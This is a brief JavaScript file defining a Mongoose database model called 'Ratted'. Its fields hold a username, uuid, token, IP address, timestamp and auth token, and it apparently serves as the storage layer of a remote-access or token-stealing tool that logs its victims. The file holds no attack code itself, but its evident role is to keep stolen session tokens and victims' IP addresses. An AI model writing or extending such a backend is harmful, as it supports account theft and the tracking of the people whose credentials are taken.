const mongoose = require("mongoose")

const rattedSchema = mongoose.Schema({
    username: String,
    uuid: String,
    token: String,
    ip: String,
    timestamp: Date,
    tokenAuth: String,
})

module.exports = mongoose.model("Ratted", rattedSchema)